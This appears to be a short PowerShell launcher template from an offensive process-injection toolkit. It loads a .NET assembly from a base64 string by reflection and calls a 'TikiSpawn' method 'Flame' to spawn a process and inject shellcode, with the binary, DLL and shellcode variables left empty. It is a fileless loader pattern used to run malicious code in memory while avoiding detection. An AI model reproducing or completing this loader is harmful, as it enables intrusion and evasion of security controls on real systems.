$binary = ""
$dll = ""
$shellcode = ""

[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($dll))
[TikiSpawn]::Flame($binary, $shellcode)